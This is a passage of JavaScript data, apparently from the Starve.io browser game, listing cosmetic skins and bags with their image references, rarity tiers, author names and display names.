                            day: IMAGES.SKIN68D,
                            night: IMAGES.SKIN68N,
                            dayHand: IMAGES.HAND_SKIN68D,
                            nightHand: IMAGES.HAND_SKIN68N,
                            rarity: RARITY.DIAMOND,
                            author: "Anyone want to play?",
                            name: "Mr. Spider 2"
                        }, {
                            id: 82,
                            day: IMAGES.SKIN57D,
                            night: IMAGES.SKIN57N,
                            dayHand: IMAGES.HAND_SKIN57D,
                            nightHand: IMAGES.HAND_SKIN57N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Blue Starfish"
                        }, {
                            id: 83,
                            day: IMAGES.SKIN58D,
                            night: IMAGES.SKIN58N,
                            dayHand: IMAGES.HAND_SKIN58D,
                            nightHand: IMAGES.HAND_SKIN58N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Orange Starfish"
                        }, {
                            id: 84,
                            day: IMAGES.SKIN59D,
                            night: IMAGES.SKIN59N,
                            dayHand: IMAGES.HAND_SKIN59D,
                            nightHand: IMAGES.HAND_SKIN59N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Pink Starfish"
                        }, {
                            id: 85,
                            day: IMAGES.SKIN60D,
                            night: IMAGES.SKIN60N,
                            dayHand: IMAGES.HAND_SKIN60D,
                            nightHand: IMAGES.HAND_SKIN60N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. ShellMauve"
                        }, {
                            id: 86,
                            day: IMAGES.SKIN61D,
                            night: IMAGES.SKIN61N,
                            dayHand: IMAGES.HAND_SKIN61D,
                            nightHand: IMAGES.HAND_SKIN61N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Shell Bead"
                        }, {
                            id: 96,
                            day: IMAGES.SKIN72D,
                            night: IMAGES.SKIN72N,
                            dayHand: IMAGES.HAND_SKIN72D,
                            nightHand: IMAGES.HAND_SKIN72N,
                            rarity: RARITY.DIAMOND,
                            author: "Fukss",
                            name: "Angry Crab"
                        }, {
                            id: 98,
                            day: IMAGES.SKIN73D,
                            night: IMAGES.SKIN73N,
                            dayHand: IMAGES.HAND_SKIN73D,
                            nightHand: IMAGES.HAND_SKIN73N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Penguin"
                        }, {
                            id: 126,
                            day: IMAGES.SKIN101D,
                            night: IMAGES.SKIN101N,
                            dayHand: IMAGES.HAND_SKIN101D,
                            nightHand: IMAGES.HAND_SKIN101N,
                            rarity: RARITY.DIAMOND,
                            author: "Anyone want to play?",
                            name: "Mr. Boar"
                        }, {
                            id: 145,
                            day: IMAGES.SKIN121D,
                            night: IMAGES.SKIN121N,
                            dayHand: IMAGES.HAND_SKIN121D,
                            nightHand: IMAGES.HAND_SKIN121N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "I saw you"
                        }, {
                            id: 146,
                            day: IMAGES.SKIN122D,
                            night: IMAGES.SKIN122N,
                            dayHand: IMAGES.HAND_SKIN122D,
                            nightHand: IMAGES.HAND_SKIN122N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "It was funny"
                        }, {
                            id: 147,
                            day: IMAGES.SKIN123D,
                            night: IMAGES.SKIN123N,
                            dayHand: IMAGES.HAND_SKIN123D,
                            nightHand: IMAGES.HAND_SKIN123N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "You can scream"
                        }, {
                            id: 158,
                            day: IMAGES.SKIN134D,
                            night: IMAGES.SKIN134N,
                            dayHand: IMAGES.HAND_SKIN134D,
                            nightHand: IMAGES.HAND_SKIN134N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Mr. Book"
                        }, {
                            id: 163,
                            day: IMAGES.SKIN139D,
                            night: IMAGES.SKIN139N,
                            dayHand: IMAGES.HAND_SKIN139D,
                            nightHand: IMAGES.HAND_SKIN139N,
                            rarity: RARITY.DIAMOND,
                            author: "Anyone want to play?",
                            name: "Mr. Mammoth"
                        }, {
                            id: 164,
                            day: IMAGES.SKIN140D,
                            night: IMAGES.SKIN140N,
                            dayHand: IMAGES.HAND_SKIN140D,
                            nightHand: IMAGES.HAND_SKIN140N,
                            rarity: RARITY.DIAMOND,
                            author: "SoOw",
                            name: "Mr. Mammoth 2"
                        }, {
                            id: 161,
                            day: IMAGES.SKIN137D,
                            night: IMAGES.SKIN137N,
                            dayHand: IMAGES.HAND_SKIN137D,
                            nightHand: IMAGES.HAND_SKIN137N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Nightmare"
                        }, {
                            id: 168,
                            day: IMAGES.SKIN144D,
                            night: IMAGES.SKIN144N,
                            dayHand: IMAGES.HAND_SKIN144D,
                            nightHand: IMAGES.HAND_SKIN144N,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Shiny Crystal"
                        }, {
                            id: 173,
                            day: IMAGES.SKIN150D,
                            night: IMAGES.SKIN150N,
                            dayHand: IMAGES.HAND_SKIN150D,
                            nightHand: IMAGES.HAND_SKIN150N,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Water skin"
                        }, {
                            id: 42,
                            day: IMAGES.SKIN14D,
                            night: IMAGES.SKIN14N,
                            dayHand: IMAGES.HAND_SKIN14D,
                            nightHand: IMAGES.HAND_SKIN14N,
                            rarity: RARITY.AMETHYST,
                            author: "Winter",
                            name: "Will-O'-The-Wisp"
                        }, {
                            id: 91,
                            day: IMAGES.SKIN66D,
                            night: IMAGES.SKIN66N,
                            dayHand: IMAGES.HAND_SKIN66D,
                            nightHand: IMAGES.HAND_SKIN66N,
                            rarity: RARITY.AMETHYST,
                            author: "ExpertyAnimations",
                            name: "Flame"
                        }, {
                            id: 26,
                            day: IMAGES.SKIN15D,
                            night: IMAGES.SKIN15N,
                            dayHand: IMAGES.HAND_SKIN15D,
                            nightHand: IMAGES.HAND_SKIN15N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Be a Tree"
                        }, {
                            id: 38,
                            day: IMAGES.SKIN18D,
                            night: IMAGES.SKIN18N,
                            dayHand: IMAGES.HAND_SKIN18D,
                            nightHand: IMAGES.HAND_SKIN18N,
                            rarity: RARITY.AMETHYST,
                            author: "Winter",
                            name: "Toxic Mutant"
                        }, {
                            id: 50,
                            day: IMAGES.SKIN25D,
                            night: IMAGES.SKIN25N,
                            dayHand: IMAGES.HAND_SKIN25D,
                            nightHand: IMAGES.HAND_SKIN25N,
                            rarity: RARITY.AMETHYST,
                            author: "Communist",
                            name: "Mr. Tomato"
                        }, {
                            id: 54,
                            day: IMAGES.SKIN29D,
                            night: IMAGES.SKIN29N,
                            dayHand: IMAGES.HAND_SKIN29D,
                            nightHand: IMAGES.HAND_SKIN29N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mr. Mauve, the Lapa"
                        }, {
                            id: 57,
                            day: IMAGES.SKIN32D,
                            night: IMAGES.SKIN32N,
                            dayHand: IMAGES.HAND_SKIN32D,
                            nightHand: IMAGES.HAND_SKIN32N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Golden Fish"
                        }, {
                            id: 64,
                            day: IMAGES.SKIN39D,
                            night: IMAGES.SKIN39N,
                            dayHand: IMAGES.HAND_SKIN39D,
                            nightHand: IMAGES.HAND_SKIN39N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "LapaMauve"
                        }, {
                            id: 65,
                            day: IMAGES.SKIN40D,
                            night: IMAGES.SKIN40N,
                            dayHand: IMAGES.HAND_SKIN40D,
                            nightHand: IMAGES.HAND_SKIN40N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "LapaMauve "
                        }, {
                            id: 92,
                            day: IMAGES.SKIN67D,
                            night: IMAGES.SKIN67N,
                            dayHand: IMAGES.HAND_SKIN67D,
                            nightHand: IMAGES.HAND_SKIN67N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mr. Burger"
                        }, {
                            id: 66,
                            day: IMAGES.SKIN41D,
                            night: IMAGES.SKIN41N,
                            dayHand: IMAGES.HAND_SKIN41D,
                            nightHand: IMAGES.HAND_SKIN41N,
                            rarity: RARITY.AMETHYST,
                            author: "pizza wa",
                            name: "Tropical Starver"
                        }, {
                            id: 80,
                            day: IMAGES.SKIN55D,
                            night: IMAGES.SKIN55N,
                            dayHand: IMAGES.HAND_SKIN55D,
                            nightHand: IMAGES.HAND_SKIN55N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mr. ShellPink"
                        }, {
                            id: 81,
                            day: IMAGES.SKIN56D,
                            night: IMAGES.SKIN56N,
                            dayHand: IMAGES.HAND_SKIN56D,
                            nightHand: IMAGES.HAND_SKIN56N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Mr. OranShell"
                        }, {
                            id: 99,
                            day: IMAGES.SKIN74D,
                            night: IMAGES.SKIN74N,
                            dayHand: IMAGES.HAND_SKIN74D,
                            nightHand: IMAGES.HAND_SKIN74N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Pepe"
                        }, {
                            id: 100,
                            day: IMAGES.SKIN75D,
                            night: IMAGES.SKIN75N,
                            dayHand: IMAGES.HAND_SKIN75D,
                            nightHand: IMAGES.HAND_SKIN75N,
                            rarity: RARITY.AMETHYST,
                            author: "fatant",
                            name: "Mr. Ant"
                        }, {
                            id: 115,
                            day: IMAGES.SKIN90D,
                            night: IMAGES.SKIN90N,
                            dayHand: IMAGES.HAND_SKIN90D,
                            nightHand: IMAGES.HAND_SKIN90N,
                            rarity: RARITY.AMETHYST,
                            author: "MADBalgouthi",
                            name: "Mr. Watermelon"
                        }, {
                            id: 101,
                            day: IMAGES.SKIN76D,
                            night: IMAGES.SKIN76N,
                            dayHand: IMAGES.HAND_SKIN76D,
                            nightHand: IMAGES.HAND_SKIN76N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Mr. Thornbush"
                        }, {
                            id: 131,
                            day: IMAGES.SKIN106D,
                            night: IMAGES.SKIN106N,
                            dayHand: IMAGES.HAND_SKIN106D,
                            nightHand: IMAGES.HAND_SKIN106N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Cthulhu"
                        }, {
                            id: 143,
                            day: IMAGES.SKIN119D,
                            night: IMAGES.SKIN119N,
                            dayHand: IMAGES.HAND_SKIN119D,
                            nightHand: IMAGES.HAND_SKIN119N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Mr. Cactus"
                        }, {
                            id: 144,
                            day: IMAGES.SKIN120D,
                            night: IMAGES.SKIN120N,
                            dayHand: IMAGES.HAND_SKIN120D,
                            nightHand: IMAGES.HAND_SKIN120N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Momo"
                        }, {
                            id: 95,
                            day: IMAGES.SKIN70D,
                            night: IMAGES.SKIN70N,
                            dayHand: IMAGES.HAND_SKIN70D,
                            nightHand: IMAGES.HAND_SKIN70N,
                            rarity: RARITY.REIDITE,
                            author: "Taco4Life",
                            name: "Mr. Garlic"
                        }, {
                            id: 76,
                            day: IMAGES.SKIN51D,
                            night: IMAGES.SKIN51N,
                            dayHand: IMAGES.HAND_SKIN51D,
                            nightHand: IMAGES.HAND_SKIN51N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Robot Dragon"
                        }, {
                            id: 44,
                            day: IMAGES.SKIN1D,
                            night: IMAGES.SKIN1N,
                            dayHand: IMAGES.HAND_SKIN1D,
                            nightHand: IMAGES.HAND_SKIN1N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Lava Dragon Version 1"
                        }, {
                            id: 90,
                            day: IMAGES.SKIN65D,
                            night: IMAGES.SKIN65N,
                            dayHand: IMAGES.HAND_SKIN65D,
                            nightHand: IMAGES.HAND_SKIN65N,
                            rarity: RARITY.REIDITE,
                            author: "ExpertyAnimations",
                            name: "Lava Dragon Version 2"
                        }, {
                            id: 124,
                            day: IMAGES.SKIN99D,
                            night: IMAGES.SKIN99N,
                            dayHand: IMAGES.HAND_SKIN99D,
                            nightHand: IMAGES.HAND_SKIN99N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Lava Dragon Version 3"
                        }, {
                            id: 45,
                            day: IMAGES.SKIN12D,
                            night: IMAGES.SKIN12N,
                            dayHand: IMAGES.HAND_SKIN12D,
                            nightHand: IMAGES.HAND_SKIN12N,
                            rarity: RARITY.REIDITE,
                            author: "Sushui",
                            name: "Ice Dragon Version 1"
                        }, {
                            id: 46,
                            day: IMAGES.SKIN13D,
                            night: IMAGES.SKIN13N,
                            dayHand: IMAGES.HAND_SKIN13D,
                            nightHand: IMAGES.HAND_SKIN13N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Ice Dragon Version 2"
                        }, {
                            id: 108,
                            day: IMAGES.SKIN83D,
                            night: IMAGES.SKIN83N,
                            dayHand: IMAGES.HAND_SKIN83D,
                            nightHand: IMAGES.HAND_SKIN83N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Ice Dragon Version 3"
                        }, {
                            id: 123,
                            day: IMAGES.SKIN98D,
                            night: IMAGES.SKIN98N,
                            dayHand: IMAGES.HAND_SKIN98D,
                            nightHand: IMAGES.HAND_SKIN98N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Baby Dragon Version 1"
                        }, {
                            id: 128,
                            day: IMAGES.SKIN103D,
                            night: IMAGES.SKIN103N,
                            dayHand: IMAGES.HAND_SKIN103D,
                            nightHand: IMAGES.HAND_SKIN103N,
                            rarity: RARITY.REIDITE,
                            author: "MADBalgouthi",
                            name: "Baby Dragon Version 2"
                        }, {
                            id: 125,
                            day: IMAGES.SKIN100D,
                            night: IMAGES.SKIN100N,
                            dayHand: IMAGES.HAND_SKIN100D,
                            nightHand: IMAGES.HAND_SKIN100N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Baby Lava"
                        }, {
                            id: 47,
                            day: IMAGES.SKIN21D,
                            night: IMAGES.SKIN21N,
                            dayHand: IMAGES.HAND_SKIN21D,
                            nightHand: IMAGES.HAND_SKIN21N,
                            rarity: RARITY.REIDITE,
                            author: "Taco4Life",
                            name: "Kraken"
                        }, {
                            id: 129,
                            day: IMAGES.SKIN104D,
                            night: IMAGES.SKIN104N,
                            dayHand: IMAGES.HAND_SKIN104D,
                            nightHand: IMAGES.HAND_SKIN104N,
                            rarity: RARITY.REIDITE,
                            author: "Taco4Life",
                            name: "Sandworm"
                        }, {
                            id: 63,
                            day: IMAGES.SKIN38D,
                            night: IMAGES.SKIN38N,
                            dayHand: IMAGES.HAND_SKIN38D,
                            nightHand: IMAGES.HAND_SKIN38N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Mr. Golden Bread"
                        }, {
                            id: 67,
                            day: IMAGES.SKIN42D,
                            night: IMAGES.SKIN42N,
                            dayHand: IMAGES.HAND_SKIN42D,
                            nightHand: IMAGES.HAND_SKIN42N,
                            rarity: RARITY.REIDITE,
                            author: "ForgottenHeroe",
                            name: "Starver Ores"
                        }, {
                            id: 130,
                            day: IMAGES.SKIN105D,
                            night: IMAGES.SKIN105N,
                            dayHand: IMAGES.HAND_SKIN105D,
                            nightHand: IMAGES.HAND_SKIN105N,
                            rarity: RARITY.REIDITE,
                            author: "Taco4Life",
                            name: "Poo"
                        }, {
                            id: 89,
                            day: IMAGES.SKIN64D,
                            night: IMAGES.SKIN64N,
                            dayHand: IMAGES.HAND_SKIN64D,
                            nightHand: IMAGES.HAND_SKIN64N,
                            rarity: RARITY.REIDITE,
                            author: "Poinet",
                            name: "Volcano Starver"
                        }, {
                            id: 112,
                            day: IMAGES.SKIN87D,
                            night: IMAGES.SKIN87N,
                            dayHand: IMAGES.HAND_SKIN87D,
                            nightHand: IMAGES.HAND_SKIN87N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Lava Starver"
                        }, {
                            id: 48,
                            day: IMAGES.SKIN_ROBOTD,
                            night: IMAGES.SKIN_ROBOTN,
                            dayHand: IMAGES.HAND_ROBOTD,
                            nightHand: IMAGES.HAND_ROBOTN,
                            rarity: RARITY.SPECIAL,
                            author: "eogito",
                            name: "Robot"
                        }, {
                            id: 110,
                            day: IMAGES.SKIN85D,
                            night: IMAGES.SKIN85N,
                            dayHand: IMAGES.HAND_SKIN85D,
                            nightHand: IMAGES.HAND_SKIN85N,
                            rarity: RARITY.SPECIAL,
                            author: "pizza wa",
                            name: "Blue Butterfly"
                        }, {
                            id: 157,
                            day: IMAGES.SKIN133D,
                            night: IMAGES.SKIN133N,
                            dayHand: IMAGES.HAND_SKIN133D,
                            nightHand: IMAGES.HAND_SKIN133N,
                            rarity: RARITY.SPECIAL,
                            author: "eogito",
                            name: "Yrifox"
                        }, {
                            id: 165,
                            day: IMAGES.SKIN141D,
                            night: IMAGES.SKIN141N,
                            dayHand: IMAGES.HAND_SKIN141D,
                            nightHand: IMAGES.HAND_SKIN141N,
                            rarity: RARITY.SPECIAL,
                            author: "OmarJr13",
                            name: "Blob Skin"
                        }],
                        BAG: [{
                            id: 0,
                            day: IMAGES.BAGD,
                            night: IMAGES.BAGN,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Bag 1"
                        }, {
                            id: 1,
                            day: IMAGES.BAG0D,
                            night: IMAGES.BAG0N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Old Bag"
                        }, {
                            id: 2,
                            day: IMAGES.BAG4D,
                            night: IMAGES.BAG4N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bag 2"
                        }, {
                            id: 3,
                            day: IMAGES.BAG5D,
                            night: IMAGES.BAG5N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bag 3"
                        }, {
                            id: 4,
                            day: IMAGES.BAG6D,
                            night: IMAGES.BAG6N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bag 4"
                        }, {
                            id: 5,
                            day: IMAGES.BAG7D,
                            night: IMAGES.BAG7N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bag 5"
                        }, {
                            id: 11,
                            day: IMAGES.BAG23D,
                            night: IMAGES.BAG23N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Wood Pickaxe Bag"
                        }, {
                            id: 19,
                            day: IMAGES.BAG16D,
                            night: IMAGES.BAG16N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io ",
                            name: "Wood Carrier"
                        }, {
                            id: 37,
                            day: IMAGES.BAG36D,
                            night: IMAGES.BAG36N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Bag 6"
                        }, {
                            id: 39,
                            day: IMAGES.BAG38D,
                            night: IMAGES.BAG38N,
                            rarity: RARITY.WOOD,
                            author: "eogito",
                            name: "Bag with Wooden Swords"
                        }, {
                            id: 44,
                            day: IMAGES.BAG43D,
                            night: IMAGES.BAG43N,
                            rarity: RARITY.WOOD,
                            author: "Communist",
                            name: "Big Bag"
                        }, {
                            id: 7,
                            day: IMAGES.BAG14D,
                            night: IMAGES.BAG14N,
                            rarity: RARITY.STONE,
                            author: "Communist",
                            name: "Bag 6"
                        }, {
                            id: 8,
                            day: IMAGES.BAG_EASTERD,
                            night: IMAGES.BAG_EASTERN,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Easter Bag"
                        }, {
                            id: 9,
                            day: IMAGES.BAG_STARD,
                            night: IMAGES.BAG_STARN,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Star Bag"
                        }, {
                            id: 10,
                            day: IMAGES.BAG9D,
                            night: IMAGES.BAG9N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Winter Bag"
                        }, {
                            id: 20,
                            day: IMAGES.BAG17D,
                            night: IMAGES.BAG17N,
                            rarity: RARITY.STONE,
                            author: "Starve.io ",
                            name: "Stone Carrier"
                        }, {
                            id: 24,
                            day: IMAGES.BAG24D,
                            night: IMAGES.BAG24N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Stone Pickaxe Bag"
                        }, {
                            id: 6,
                            day: IMAGES.BAG13D,
                            night: IMAGES.BAG13N,
                            rarity: RARITY.STONE,
                            author: "Communist",
                            name: "Bag Camouflage"
                        }, {
                            id: 38,
                            day: IMAGES.BAG37D,
                            night: IMAGES.BAG37N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Bag with Stone Swords"
                        }, {
                            id: 54,
                            day: IMAGES.BAG53D,
                            night: IMAGES.BAG53N,
                            rarity: RARITY.STONE,
                            author: "eogito",
                            name: "Cow Bag"
                        }, {
                            id: 59,
                            day: IMAGES.BAG58D,
                            night: IMAGES.BAG58N,
                            rarity: RARITY.STONE,
                            author: "CrysTal",
                            name: "Starver Bag"
                        }, {
                            id: 62,
                            day: IMAGES.BAG61D,
                            night: IMAGES.BAG61N,
                            rarity: RARITY.STONE,
                            author: "CrysTal",
                            name: "Crystal Sky Bag"
                        }, {
                            id: 13,
                            day: IMAGES.BAG10D,
                            night: IMAGES.BAG10N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Honey Pot"
                        }, {
                            id: 21,
                            day: IMAGES.BAG18D,
                            night: IMAGES.BAG18N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io ",
                            name: "Gold Carrier"
                        }, {
                            id: 30,
                            day: IMAGES.BAG25D,
                            night: IMAGES.BAG25N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Gold Pickaxe Bag"
                        }, {
                            id: 29,
                            day: IMAGES.BAG31D,
                            night: IMAGES.BAG31N,
                            rarity: RARITY.GOLD,
                            author: "Ariel",
                            name: "Mr and Mrs Bakers"
                        }, {
                            id: 41,
                            day: IMAGES.BAG40D,
                            night: IMAGES.BAG40N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Bag with Golden Swords"
                        }, {
                            id: 47,
                            day: IMAGES.BAG46D,
                            night: IMAGES.BAG46N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Explorer Bag"
                        }, {
                            id: 51,
                            day: IMAGES.BAG50D,
                            night: IMAGES.BAG50N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Bamboo Bag"
                        }, {
                            id: 53,
                            day: IMAGES.BAG52D,
                            night: IMAGES.BAG52N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Mummy Bag"
                        }, {
                            id: 58,
                            day: IMAGES.BAG57D,
                            night: IMAGES.BAG57N,
                            rarity: RARITY.GOLD,
                            author: "MADBalgouthi",
                            name: "Watermelon Bag"
                        }, {
                            id: 60,
                            day: IMAGES.BAG59D,
                            night: IMAGES.BAG60N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Garlic Bag"
                        }, {
                            id: 61,
                            day: IMAGES.BAG60D,
                            night: IMAGES.BAG59N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Pumpkin Bag"
                        }, {
                            id: 64,
                            day: IMAGES.BAG63D,
                            night: IMAGES.BAG63N,
                            rarity: RARITY.GOLD,
                            author: "upfiz",
                            name: "Oil Barel bag"
                        }, {
                            id: 67,
                            day: IMAGES.BAG68D,
                            night: IMAGES.BAG68N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Tree Bag"
                        }, {
                            id: 14,
                            day: IMAGES.BAG1D,
                            night: IMAGES.BAG1N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "a Rabbit in my Bag"
                        }, {
                            id: 15,
                            day: IMAGES.BAG2D,
                            night: IMAGES.BAG2N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Bird's nest"
                        }, {
                            id: 16,
                            day: IMAGES.BAG3D,
                            night: IMAGES.BAG3N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "a Fish on your Back"
                        }, {
                            id: 17,
                            day: IMAGES.BAG8D,
                            night: IMAGES.BAG8N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "a Squirrel in my Bag"
                        }, {
                            id: 22,
                            day: IMAGES.BAG19D,
                            night: IMAGES.BAG19N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io ",
                            name: "Diamond Carrier"
                        }, {
                            id: 12,
                            day: IMAGES.BAG22D,
                            night: IMAGES.BAG22N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Resources Bag"
                        }, {
                            id: 32,
                            day: IMAGES.BAG26D,
                            night: IMAGES.BAG26N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Diamond Pickaxe Bag"
                        }, {
                            id: 40,
                            day: IMAGES.BAG39D,
                            night: IMAGES.BAG39N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Bag with Diamond Swords"
                        }, {
                            id: 45,
                            day: IMAGES.BAG44D,
                            night: IMAGES.BAG44N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "My Cake Bag"
                        }, {
                            id: 46,
                            day: IMAGES.BAG45D,
                            night: IMAGES.BAG45N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "My Christmas Cake Bag"
                        }, {
                            id: 52,
                            day: IMAGES.BAG51D,
                            night: IMAGES.BAG51N,
                            rarity: RARITY.DIAMOND,
                            author: "MADBalgouthi",
                            name: "Fish Bag"
                        }, {
                            id: 65,
                            day: IMAGES.BAG64D,
                            night: IMAGES.BAG64N,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Cloud Bag"
                        }, {
                            id: 68,
                            day: IMAGES.BAG66D,
                            night: IMAGES.BAG66N,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Bee Bag"
                        }, {
                            id: 48,
                            day: IMAGES.BAG47D,
                            night: IMAGES.BAG47N,
                            rarity: RARITY.AMETHYST,
                            author: "fatant",
                            name: "Natural Bag"
                        }, {
                            id: 23,
                            day: IMAGES.BAG20D,
                            night: IMAGES.BAG20N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io ",
                            name: "Amethyst Carrier"
                        }, {
                            id: 25,
                            day: IMAGES.BAG27D,
                            night: IMAGES.BAG27N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Amethyst Pickaxe Bag"
                        }, {
                            id: 28,
                            day: IMAGES.BAG30D,
                            night: IMAGES.BAG30N,
                            rarity: RARITY.AMETHYST,
                            author: "Starve.io",
                            name: "Your Baby"
                        }, {
                            id: 33,
                            day: IMAGES.BAG32D,
                            night: IMAGES.BAG32N,
                            rarity: RARITY.AMETHYST,
                            author: "pizza wa",
                            name: "Tropical Bag"
                        }, {
                            id: 43,
                            day: IMAGES.BAG42D,
                            night: IMAGES.BAG42N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Bag with Amethyst Swords"
                        }, {
                            id: 35,
                            day: IMAGES.BAG34D,
                            night: IMAGES.BAG34N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Ice Bag"
                        }, {
                            id: 50,
                            day: IMAGES.BAG49D,
                            night: IMAGES.BAG49N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Thornbush Bag"
                        }, {
                            id: 56,
                            day: IMAGES.BAG55D,
                            night: IMAGES.BAG55N,
                            rarity: RARITY.AMETHYST,
                            author: "eogito",
                            name: "Autumn Bag"
                        }, {
                            id: 57,
                            day: IMAGES.BAG56D,
                            night: IMAGES.BAG56N,
                            rarity: RARITY.AMETHYST,
                            author: "Taco4Life",
                            name: "Dino Egg Bag"
                        }, {
                            id: 66,
                            day: IMAGES.BAG65D,
                            night: IMAGES.BAG65N,
                            rarity: RARITY.AMETHYST,
                            author: "pizza wa",
                            name: "Magic Cloud Bag"
                        }, {
                            id: 69,
                            day: IMAGES.BAG67D,
                            night: IMAGES.BAG67N,
                            rarity: RARITY.AMETHYST,
                            author: "pizza wa",
                            name: "Chest Bag"
                        }, {
                            id: 31,
                            day: IMAGES.BAG21D,
                            night: IMAGES.BAG21N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io ",
                            name: "Reidite Carrier"
                        }, {
                            id: 18,
                            day: IMAGES.BAG11D,
                            night: IMAGES.BAG11N,
                            rarity: RARITY.REIDITE,
                            author: "Winter",
                            name: "Lava Bag"
                        }, {
                            id: 49,
                            day: IMAGES.BAG48D,
                            night: IMAGES.BAG48N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Lava Bag 2"
                        }, {
                            id: 36,
                            day: IMAGES.BAG35D,
                            night: IMAGES.BAG35N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Dragon Bag"
                        }, {
                            id: 55,
                            day: IMAGES.BAG54D,
                            night: IMAGES.BAG54N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Winter Ice Bag"
                        }, {
                            id: 26,
                            day: IMAGES.BAG28D,
                            night: IMAGES.BAG28N,
                            rarity: RARITY.REIDITE,
                            author: "eogito",
                            name: "Reidite Pickaxe Bag"
                        }, {
                            id: 27,
                            day: IMAGES.BAG29D,
                            night: IMAGES.BAG29N,
                            rarity: RARITY.REIDITE,
                            author: "Starve.io",
                            name: "Octopus Bowl"
                        }, {
                            id: 34,
                            day: IMAGES.BAG33D,
                            night: IMAGES.BAG33N,
                            rarity: RARITY.REIDITE,
                            author: "Taco4Life",
                            name: "Cave Bag"
                        }, {
                            id: 42,
                            day: IMAGES.BAG41D,
